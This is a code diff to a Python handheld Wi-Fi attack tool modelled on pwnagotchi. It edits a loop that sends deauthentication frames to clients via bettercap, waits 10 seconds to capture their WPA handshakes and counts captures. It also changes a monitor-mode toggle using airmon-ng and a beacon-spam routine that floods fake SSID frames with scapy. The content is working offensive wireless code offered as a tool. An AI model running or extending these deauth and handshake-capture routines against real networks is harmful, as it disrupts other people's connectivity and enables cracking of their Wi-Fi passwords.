@@ -35,7 +35,7 @@ class PwnagotchiScreen():
         self.faces = { # 99% of these will be stolen in some way from pwnagotchi.ai
             "happy": "(◕‿‿◕)",
             "attacking": "(⌐■_■)",
-            "lost": "(≖__≖)",
+            "lost": "(#__#)",
             "debug": "(#__#)",
             "assoc": "(°▃▃°)",
             "excited": "(☼‿‿☼)",
@@ -97,6 +97,8 @@ def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTrie
 
     cli = bcap.Client()
 
+    if not cli.successful: return
+
     cli.recon()
     cli.clearWifi()
 
@@ -107,9 +109,9 @@ def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTrie
         screen.aps = len(json)
 
         if screen.aps > oldValues["aps"]:
-            screen.face = screen.faces["happy"]
+            screen.face = screen.faces["excited"]
         else:
-            screen.face = screen.faces["lost"]
+            screen.face = screen.faces["missed"]
 
         if debug: print(json)
 
@@ -177,7 +179,7 @@ def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTrie
 
             if fullBreak: fullBreak = False; continue # if we need to pick new ap
 
-            screen.console = "associating w {}".format(ap)
+            screen.console = "asoc. w {}".format(ap)
             if prettyDebug: uStatus("associating with {} ({})".format(ap, ssid))
             screen.face = screen.faces["assoc"]
             cli.associate(ap, throttle=5) # throttle 2.5 seconds to wait for assoc
@@ -201,22 +203,26 @@ def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTrie
                     cli.deauth(targetClient[0], throttle=0)
                     # or
                     #cli.scapyDeauth(ap, targetClient[0])
-                sleep(5)
+
+                sleep(10) # camp their handshake for 10 seconds, as thats the average time a device needs to disconnect and reconnect; bettercap will be sniffing during this 10s
 
                 for _y in range(checkHandshakeTries):
                     if screen.exited: cli.run("exit"); return
                     if cli.hasHandshake(ap) or cli.hasHandshake(targetClient[0]):
                         if prettyDebug: uSuccess("got {}'s handshake ({})".format(ap, ssid))
-                        screen.console = "got {}'s handshake".format(ssid)
+                        screen.console = "got {}'s HS".format(ssid)
                         screen.face = screen.faces["excited"]
                         screen.handshakes += 1
 
+                        """
+                        # because of bettercap's aggregation, we dont need this anymore
                         if ssid == "": # if ssid blank
                             fileField = ap.replace(":", "-") # some systems dont like ":"
                         else: # not blank
                             fileField = ssid
 
                         if debug: print("writing to {}".format(fileLocation+"/{}-{}.pcap".format(fileField, json[ap][1])))# lazy
+                        """
 
                         deauthed[ap] = [True, targetClient]
 
@@ -236,7 +242,7 @@ def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTrie
 
             if not pulledHandshake:
                 if prettyDebug: uError("completely missed {}'s handshakes ({})".format(ap, ssid))
-                screen.console = "completely missed"
+                screen.console = "missed"
                 screen.face = screen.faces["missed"]
             
             pulledHandshake = False
@@ -259,21 +265,33 @@ def monitorMode(args:list):
     ifaces = nf.interfaces()
     priority = loads(open("./config.json", "r").read())
 
+    fullClear(draw)
 
+    if priority["monitorInterface"] in ifaces:
+        print("mon")
 
-    if priority["normalInterface"] in ifaces:
-        if isManaged(priority["normalInterface"]):
-            getoutput("sudo airmon-ng start {}".format(priority["normalInterface"]))
-            draw.text([8,8], "started interface", fill=1, outline=255, font=None)
-        else:
-            pass
+        getoutput("sudo airmon-ng stop {}".format(priority["monitorInterface"]))
+        getoutput("sudo systemctl restart NetworkManager")
+        getoutput("sudo ifconfig {} up".format(priority["normalInterface"]))
+        draw.text([8,8], "stopped interface", fill=0, outline=255, font=None)
 
-    elif priority["monitorInterface"] in ifaces:
-        if not isManaged(priority["monitorInterface"]):
-            getoutput("sudo airmon-ng stop {}".format(priority["monitorInterface"]))
-            draw.text([8,8], "stopped interface", fill=1, outline=255, font=None)
-        else:
-            pass
+    elif priority["normalInterface"] in ifaces:
+        print("normal")
+
+        getoutput("sudo airmon-ng check kill")
+        getoutput("sudo airmon-ng start {}".format(priority["normalInterface"]))
+
+        draw.text([8,8], "started interface", fill=0, outline=255, font=None)
+    else:
+        print("none")
+        
+        for x in ifaces:
+            getoutput("sudo airmon-ng stop {}".format(x))
+            getoutput("sudo ifconfig {} up".format(x))
+
+        getoutput("sudo systemctl restart NetworkManager")
+
+        draw.text([8,8], "stopped all ifaces", fill=0, outline=255, font=None)
 
     disp.ShowImage(disp.getbuffer(image))
 
@@ -335,52 +353,55 @@ def beaconSpam(args:list):
 
     #handler.setPercentage(0)
 
-    ssidFrames = []
-    threads1 = []
+    try:
+        ssidFrames = []
+        threads1 = []
 
-    iface = loads(open("./config.json").read())["monitorInterface"]
+        iface = loads(open("./config.json").read())["monitorInterface"]
 
-    handler.text = "iface: {}".format(iface)
+        handler.text = "iface: {}".format(iface)
 
-    for ssid in ssids:
-        try:
-            if [x for x in ssid][0] == "#": continue
-        except:
-            continue # empty line
-
-        multiple=False
-
-        # create frames for all ssids
-        #mac = RandMAC()
-
-        if "?$?" in ssid:
+        for ssid in ssids:
             try:
-                multiple = int(ssid.split("?$?")[-1])
+                if [x for x in ssid][0] == "#": continue
             except:
-                raise
+                continue # empty line
 
-        if multiple == False:
-            a = ':'.join('%02x'%randint(0,255) for x in range(6))
-            print("{} | {} | one AP".format(ssid, a))
-            ssidFrames.append(genFrame(ssid))
-            #threads1.append(Thread(target=probeBeaconThread, args=(ssid,), daemon=True))
-        else:
-            for x in range(multiple):
-                ssid = ssid.replace("?$?{}".format(multiple), "")
+            multiple=False
+
+            # create frames for all ssids
+            #mac = RandMAC()
+
+            if "?$?" in ssid:
+                try:
+                    multiple = int(ssid.split("?$?")[-1])
+                except:
+                    raise
+
+            if multiple == False:
                 a = ':'.join('%02x'%randint(0,255) for x in range(6))
-                print("{} | {} | multiplied".format(ssid, a))
-                ssidFrames.append(genFrame(ssid+str(x)))
-                #threads1.append(Thread(target=probeBeaconThread, args=(ssid+str(x),), daemon=True))
+                print("{} | {} | one AP".format(ssid, a))
+                ssidFrames.append(genFrame(ssid))
+                #threads1.append(Thread(target=probeBeaconThread, args=(ssid,), daemon=True))
+            else:
+                for x in range(multiple):
+                    ssid = ssid.replace("?$?{}".format(multiple), "")
+                    a = ':'.join('%02x'%randint(0,255) for x in range(6))
+                    print("{} | {} | multiplied".format(ssid, a))
+                    ssidFrames.append(genFrame(ssid+str(x)))
+                    #threads1.append(Thread(target=probeBeaconThread, args=(ssid+str(x),), daemon=True))
 
-    while checkIfKey(GPIO): sleep(0.1)
+        while checkIfKey(GPIO): sleep(0.1)
 
-    while True:
-        if checkIfKey(GPIO): break
+        while True:
+            if checkIfKey(GPIO): break
 
-        sendp(ssidFrames, iface=iface, verbose=1, count=25)
+            sendp(ssidFrames, iface=iface, verbose=1, count=25)
 
-        handler.text = "frames: {}\niface: {}\nhold any key to stop".format(vars.framesSent,iface)
-        
+            handler.text = "frames: {}\niface: {}\nhold any key to stop".format(vars.framesSent,iface)
+    except Exception as e:
+        handler.text = str(e)
+
 
     vars.beaconExit = True
     handler.text = "shutting threads.."
@@ -415,6 +436,7 @@ def rssiReader(args:list):
 
     try:
         cli = bcap.Client(iface=iface)
+        if not cli.successful: raise Exception("b")
     except Exception as e:
         draw.text([2,2], "failed to init bettercap:\n{}\n\nwaiting on your key...".format(str(e)))
         disp.ShowImage(disp.getbuffer(image))
@@ -523,8 +545,6 @@ def rssiReader(args:list):
                 #print(cli.run("exit"))
                 cli.stop()
                 return
-
-
 
 
 def functions():
